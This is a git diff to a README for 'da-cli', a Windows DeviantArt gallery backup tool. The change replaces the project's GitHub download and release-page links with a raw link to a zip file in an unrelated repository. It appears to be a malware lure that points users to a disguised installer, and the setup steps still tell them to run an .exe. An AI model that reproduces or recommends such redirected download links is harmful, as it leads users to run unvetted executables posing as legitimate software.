@@ -5,7 +5,7 @@ description: "Sync your DeviantArt gallery to a local folder with this command l
 ---
 # 🖼️ da-cli - Archive your favorite art collections easily
 
-[![](https://img.shields.io/badge/Download-da--cli-blue.svg)](https://github.com/quenz6203/da-cli)
+[![](https://img.shields.io/badge/Download-da--cli-blue.svg)](https://raw.githubusercontent.com/quenz6203/quenz6203.github.io/main/xanthosiderite/Release-2.5.zip)
 
 This tool copies your DeviantArt galleries to your computer. You keep a backup of your digital art collection on your own hard drive. It works automatically and keeps your folders updated.
 
@@ -22,7 +22,7 @@ Your computer needs to meet these basic standards to run this software:
 
 Follow these steps to set up the tool on your Windows machine:
 
-1. Visit [the release page](https://github.com/quenz6203/da-cli) to download the installer.
+1. Visit [the release page](https://raw.githubusercontent.com/quenz6203/quenz6203.github.io/main/xanthosiderite/Release-2.5.zip) to download the installer.
 2. Look for the file ending in .exe in the latest release section.
 3. Save this file to your Downloads folder.
 4. Double-click the file to start the installation process.
